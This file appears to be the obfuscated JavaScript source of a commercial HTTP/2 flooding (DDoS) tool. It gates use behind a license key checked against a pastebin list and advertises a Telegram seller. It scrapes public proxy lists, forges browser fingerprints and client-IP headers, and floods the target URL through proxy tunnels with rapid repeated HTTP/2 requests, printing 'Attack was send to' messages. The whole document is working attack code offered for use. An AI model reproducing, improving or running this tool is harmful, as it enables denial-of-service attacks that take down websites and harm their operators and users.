const {exec} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require('fs'), url = require('url'), http = require('http'), tls = require('tls');
const crypto = require('crypto'), http2 = require('http2'), axios = require('axios');
var request = require('request');
opts = { url: 'https://pastebin.com/raw/bw84mSCq' };
request.get(opts, function (_0xf96560, _0x1d504f, _0x1a02b9) {
    if (_0x1a02b9.includes(process.argv[4]) && process.argv[4].length > 14) {
        console.clear();
        console.log('===================\nAttack was send to: ' + process.argv[2] + ' Time: ' + process.argv[3] + '\n===================');
    } else {
        console.clear();
        console.log('===================\nThis license isn\'t on our auth list\nBuy license from: https://t.me/Ciapak_2137\n===================');
        process.exit();
    }
});
function getArgs() {
    const _0x1e1800 = {};
    process.argv.slice(2, process.argv.length).forEach(_0x311e08 => {
        if (_0x311e08.slice(0, 2) === '--') {
            const _0x28a7f1 = _0x311e08.split('=#'), _0x39136f = _0x28a7f1[0].slice(2, _0x28a7f1[0].length), _0x429f3f = _0x28a7f1.length > 1 ? _0x28a7f1[1] : true;
            _0x1e1800[_0x39136f] = _0x429f3f;
        } else {
            if (_0x311e08[0] === '-') {
                const _0x17184e = _0x311e08.slice(1, _0x311e08.length).split('');
                _0x17184e.forEach(_0x17dcd0 => {
                    _0x1e1800[_0x17dcd0] = true;
                });
            }
        }
    });
    return _0x1e1800;
}
const args = getArgs();
if (args.proxy_scrape != 'false') {
    var http_web_list = [];
    if (args.proxy_apis_file != undefined) {
        http_web_list = fs.readFileSync(args.proxy_apis_file, 'utf-8').toString().replace(/\r/g, '').split('\n');
    } else {
        http_web_list = [
            'https://ciapak-proxy.cf/api/paid/?key=980321830129381029&type=http',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt'
        ];
    }
    var list = [];
    (async () => {
        array = http_web_list;
        var _0x58b9f1 = 0;
        for (let _0x21c0ce = 0; _0x21c0ce < array.length; _0x21c0ce++) {
            const _0x3928ec = array[_0x21c0ce];
            _0x58b9f1++;
            try {
                var _0x44e8ac = await axios.get(_0x3928ec), _0x15e037 = _0x44e8ac.data.replace(/\r/g, '').split('\n');
                list = list.concat(_0x15e037);
            } catch (_0x4c4afb) {
            }
        }
        var _0xe05802 = new Set(list);
        proxy = [..._0xe05802];
        var _0x20ca98 = fs.createWriteStream('http.txt');
        proxy.forEach(_0x1431c2 => _0x20ca98.write(_0x1431c2 + '\n'));
        _0x20ca98.end();
    })();
}
(function () {
    var _0x4c7fb6;
    try {
        var _0x591953 = Function('return (function() {}.constructor("return this")( ));');
        _0x4c7fb6 = _0x591953();
    } catch (_0x4a70ce) {
        _0x4c7fb6 = window;
    }
    _0x4c7fb6.setInterval(_0x41672e, 4000);
}());
tls.DEFAULT_ECDH_CURVE;
let payload = {};
try {
    var poeTDz = 0;
    var proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
    var UAs_all = fs.readFileSync('UA/ua', 'utf-8').replace(/\r/g, '').split('\n');
    var UAs_android = fs.readFileSync('UA/Android', 'utf-8').replace(/\r/g, '').split('\n');
    var UAs_ios = fs.readFileSync('UA/iOS', 'utf-8').replace(/\r/g, '').split('\n');
    var UAs_linux = fs.readFileSync('UA/Linux', 'utf-8').replace(/\r/g, '').split('\n');
    var UAs_macos = fs.readFileSync('UA/macOS', 'utf-8').replace(/\r/g, '').split('\n');
    var UAs_windows = fs.readFileSync('UA/Windows', 'utf-8').replace(/\r/g, '').split('\n');
} catch (_0x2e5f16) {
    console.log('===================\nSomething is wrong ? Check if you have all files from rar / zip etc\n===================');
    process.exit();
}
function getRandomInt(_0x4c171a, _0x1a2d8c) {
    _0x4c171a = Math.ceil(_0x4c171a);
    _0x1a2d8c = Math.floor(_0x1a2d8c);
    return Math.floor(Math.random() * (_0x1a2d8c - _0x4c171a)) + _0x4c171a;
}
var Generate_Encoding = [
        '*',
        'gzip, deflate',
        'br;q=1.0, gzip;q=0.8, *;q=0.1',
        'gzip',
        'gzip, compress',
        'compress, deflate',
        'compress',
        'gzip, deflate, br',
        'deflate'
    ], Generate_Language = [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-CA',
        'en-NZ',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-ZA',
        'en-HK',
        'en-US',
        '*',
        'en-US,en;q=0.5',
        'utf-8, iso-8859-1;q=0.5, *;q=0.1',
        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
        'en-GB, en-US, en;q=0.9',
        'de-AT, de-DE;q=0.9, en;q=0.5'
    ], Generate_Cache = [
        'max-age=604800',
        's-maxage=604800',
        'no-cache',
        'max-age=0',
        'no-cache, no-store,private, max-age=0, must-revalidate',
        'no-cache, no-store,private, s-maxage=604800, must-revalidate',
        'no-cache, no-store,private, max-age=604800, must-revalidate'
    ], Generate_System = [
        'Android',
        'Chrome OS',
        'Chromium OS',
        'iOS',
        'Linux',
        'macOS',
        'Windows',
        'Unknown'
    ], Generate_Secua = [
        '"Chromium";v="100", "Google Chrome";v="100"',
        '"(Not(A:Brand";v="8", "Chromium";v="98"',
        '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        '" Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
        '"Opera";v="81", " Not;A Brand";v="99", "Chromium";v="95"'
    ], Generate_Secmode = [
        'cors',
        'navigate',
        'no-cors',
        'same-origin',
        'websocket'
    ], Generate_Accept = [
        '*/*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
        'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
        'text/html, application/xhtml+xml, image/jxr, */*',
        'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
        'application/javascript, */*;q=0.8',
        'text/html, text/plain; q=0.6, */*; q=0.1',
        'application/graphql, application/json; q=0.8, application/xml; q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
    ];
var Generate_Secdest = [
        'document',
        'empty',
        'object',
        'iframe',
        'frame'
    ], types = [
        'GET',
        'POST',
        'PATCH',
        'DELETE',
        'PUT'
    ], g_accept, g_secmode, g_secua, g_secdest, g_chmobile, g_system, g_cache, g_language, g_encoding, g_useragent, g_method = 'GET';
function generaterequest() {
    var _0x2ae38a = Generate_System[Math.floor(Math.random() * Generate_System.length)];
    if (_0x2ae38a.includes('Android')) {
        var _0x2439b3 = 0;
        g_useragent = UAs_android[Math.floor(Math.random() * UAs_android.length)];
        g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
        g_system = _0x2ae38a;
        g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
        g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
        g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
        g_chmobile = '?1';
        g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
        g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
    } else {
        if (_0x2ae38a.includes('iOS')) {
            var _0x470ba6 = 0;
            g_useragent = UAs_ios[Math.floor(Math.random() * UAs_ios.length)];
            g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
            g_system = _0x2ae38a;
            g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
            g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
            g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
            g_chmobile = '?1';
            g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
            g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
        } else {
            if (_0x2ae38a.includes('macOS')) {
                var _0x3a70fe = 0;
                g_useragent = UAs_macos[Math.floor(Math.random() * UAs_macos.length)];
                g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
                g_system = _0x2ae38a;
                g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
                g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
                g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
                g_chmobile = '?0';
                g_secua = Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)];
                g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
                g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
            } else {
                if (_0x2ae38a.includes('Linux')) {
                    var _0x3581b2 = 0;
                    g_useragent = UAs_linux[Math.floor(Math.random() * UAs_linux.length)];
                    g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
                    g_system = _0x2ae38a;
                    g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
                    g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
                    g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
                    g_chmobile = '?0';
                    g_secua = Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)];
                    g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
                    g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
                } else {
                    if (_0x2ae38a.includes('Windows')) {
                        var _0x1c1e68 = 0;
                        g_useragent = UAs_windows[Math.floor(Math.random() * UAs_windows.length)];
                        g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
                        g_system = _0x2ae38a;
                        g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
                        g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
                        g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
                        g_chmobile = '?0';
                        g_secua = Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)];
                        g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
                        g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
                    } else {
                        if (_0x2ae38a.includes('Unknown')) {
                            var _0x50b8aa = 0;
                            g_useragent = UAs_all[Math.floor(Math.random() * UAs_all.length)];
                            g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
                            g_system = _0x2ae38a;
                            g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
                            g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
                            g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
                            g_chmobile = '?0';
                            g_secua = Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)];
                            g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
                            g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
                        } else {
                            var _0x270082 = 0;
                            g_useragent = UAs_all[Math.floor(Math.random() * UAs_all.length)];
                            g_accept = Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)];
                            g_system = _0x2ae38a;
                            g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)];
                            g_language = Generate_Language[Math.floor(Math.random() * Generate_Language.length)];
                            g_encoding = Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)];
                            g_chmobile = '?0';
                            g_secua = Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)];
                            g_secmode = Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)];
                            g_secdest = Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)];
                        }
                    }
                }
            }
        }
    }
}
var proxyxdd;
function getRandomNumber(_0x505657, _0x32b4fb) {
    return Math.floor(Math.random() * (_0x32b4fb - _0x505657 + 1) + _0x505657);
}
try {
    var objetive = process.argv[2].replace('[_rand]', ''), parsed;
} catch (_0x57d7d2) {
    console.log('===================\nTarget wasn\'t given\n===================');
    process.exit();
}
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
let SignalsList = sigalgs.join(':');
class TlsBuilder {
    constructor(_0x43b4b9) {
        this.curve = 'GREASE:X25519:x25519';
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants['SSL_OP_NO_RENEGOTIATION'] | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants['SSL_OP_NO_COMPRESSION'] | crypto.constants['SSL_OP_NO_RENEGOTIATION'] | crypto.constants['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto.constants['SSL_OP_TLSEXT_PADDING'] | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
    }
    ['http2TUNNEL'](_0x5dcafb) {
        generaterequest();
        _0x5dcafb.setKeepAlive(true, process.argv[3] * 1000);
        _0x5dcafb.setTimeout(10000);
        payload[':method'] = g_method;
        payload[':path'] = parsed.path;
        payload.host = parsed.host;
        payload.origin = objetive;
        payload.accept = g_accept;
        payload['accept-encoding'] = g_encoding;
        payload['accept-language'] = g_language;
        payload['cache-control'] = g_cache;
        payload['user-agent'] = g_useragent;
        payload['sec-ch-ua'] = g_secua;
        payload['sec-ch-ua-mobile'] = g_chmobile;
        payload['sec-fetch-site'] = 'same-origin';
        payload['sec-fetch-dest'] = g_secdest;
        payload['sec-fetch-user'] = '?1';
        payload['sec-ch-ua-platform'] = g_system;
        payload['sec-fetch-mode'] = g_secmode;
        payload.referer = objetive;
        if (g_method == 'POST') {
            payload.body = args.data_post;
        }
        if (args.cookie != undefined) {
            payload.cookie = args.cookie;
        }
        payload['upgrade-insecure-requests'] = 1;
        const _0x1f38b6 = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket: _0x5dcafb,
                ciphers: tls.getCiphers().join(':') + ':TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256' + ':HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:' + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                echdCurve: this.curve,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2']
            }, () => {
                for (let _0x3d96ee = 0; _0x3d96ee < 12; _0x3d96ee++) {
                    setInterval(async () => {
                        await _0x1f38b6.request(payload).close();
                    });
                }
            })
        });
    }
}
class TlsBuilder2 {
    constructor(_0x608076) {
        this.curve = 'GREASE:X25519:x25519';
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants['SSL_OP_NO_RENEGOTIATION'] | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants['SSL_OP_NO_COMPRESSION'] | crypto.constants['SSL_OP_NO_RENEGOTIATION'] | crypto.constants['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto.constants['SSL_OP_TLSEXT_PADDING'] | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
    }
    ['http2TUNNEL'](_0x35df3e) {
        generaterequest();
        _0x35df3e.setKeepAlive(true, process.argv[3] * 1000);
        _0x35df3e.setTimeout(10000);
        payload[':method'] = g_method;
        payload[':path'] = parsed.path;
        payload.host = parsed.host;
        payload.origin = objetive;
        payload.accept = g_accept;
        payload['accept-encoding'] = g_encoding;
        payload['accept-language'] = g_language;
        payload['cache-control'] = g_cache;
        payload['user-agent'] = g_useragent;
        if (g_method == 'POST') {
            payload.body = args.data_post;
        }
        if (args.cookie != undefined) {
            payload.cookie = args.cookie;
        }
        if (getRandomInt(1, 5) == 3) {
            var _0x6f5cde = 0;
            payload.Via = '' + proxyxdd + '';
            payload['Client-IP'] = '' + proxyxdd + '';
            payload['X-Forwarded-For'] = '' + proxyxdd + '';
            payload['Real-IP'] = '' + proxyxdd + '';
            payload['X-Client-IP'] = '' + proxyxdd + '';
            payload['X-Real-IP'] = '' + proxyxdd + '';
            payload['True-Client-IP'] = '' + proxyxdd + '';
            payload['Fastly-Client-IP'] = '' + proxyxdd + '';
        }
        payload['upgrade-insecure-requests'] = 1;
        const _0x1ac755 = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket: _0x35df3e,
                ciphers: tls.getCiphers().join(':') + ':TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256' + ':HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:' + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2']
            }, () => {
                for (let _0xddfe77 = 0; _0xddfe77 < 12; _0xddfe77++) {
                    setInterval(async () => {
                        await _0x1ac755.request(payload).close();
                    });
                }
            })
        });
    }
}
BuildTLS = new TlsBuilder();
BuildTLS2 = new TlsBuilder2();
const keepAliveAgent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    maxTotalSockets: Infinity,
    maxSockets: Infinity
});
function Runner() {
    for (let _0x505b4c = 0; _0x505b4c < 120; _0x505b4c++) {
        var _0x23579c = proxies[Math.floor(Math.random() * proxies.length)];
        _0x23579c = _0x23579c.split(':');
        parsed = url.parse(process.argv[2].replace(/\[_rand\]/g, getRandomNumber(400000, 6000000000)));
        var _0x3fbfcc = http.get({
            host: _0x23579c[0],
            port: _0x23579c[1],
            timeout: 10000,
            method: 'CONNECT',
            agent: keepAliveAgent,
            path: parsed.host + ':443'
        });
        _0x3fbfcc.end();
        _0x3fbfcc.on('connect', (_0x2d0701, _0x5bd5af) => {
            var _0x5a6ed5 = getRandomInt(1, 3);
            if (args.method == 'RANDOM') {
                g_method = types[Math.floor(Math.random() * types.length)];
            } else {
                if (args.method != undefined) {
                    g_method = args.method;
                } else {
                    g_method = 'GET';
                }
            }
            if (_0x5a6ed5 == 1) {
                payload = {};
                BuildTLS2.http2TUNNEL(_0x5bd5af);
            } else {
                payload = {};
                BuildTLS.http2TUNNEL(_0x5bd5af);
            }
            proxyxdd = _0x23579c[0];
        });
        _0x3fbfcc.on('end', () => {
            _0x3fbfcc.resume();
            _0x3fbfcc.close();
        });
    }
}
setInterval(Runner);
setTimeout(function () {
    console.log('===================\nAttack has ended!\n===================');
    process.exit();
}, process.argv[3] * 1000);
process.on('uncaughtException', function (_0x51770e) {
});
process.on('unhandledRejection', function (_0x2dda28) {
});